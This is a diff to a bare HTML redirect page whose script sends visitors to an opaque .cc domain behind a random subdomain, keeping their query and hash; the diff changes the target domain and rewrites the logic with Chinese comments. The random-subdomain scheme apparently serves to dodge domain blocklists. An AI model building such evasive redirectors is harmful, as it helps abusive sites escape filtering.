@@ -3,9 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <title>Redirecting...</title>
-    <script>
-        window.location.href = "https://0v4n4ir2.cc/".replace(/^https:\/\//, "https://" + Math.random().toString(36).substring(2) + ".");
-    </script>
+        <script>
+          // 1. 建立目標 URL 物件
+          const target = new URL("https://8mzk8sog.cc/");
+          
+          // 2. 動態加入隨機子網域
+          target.hostname = Math.random().toString(36).substring(2) + "." + target.hostname;
+          
+          // 3. 繼承當前頁面的所有 search 參數與 hash 標籤
+          target.search = window.location.search;
+          target.hash = window.location.hash;
+          
+          // 4. 執行轉址
+          window.location.href = target.toString();
+        </script>
 </head>
 <body>
 </body>
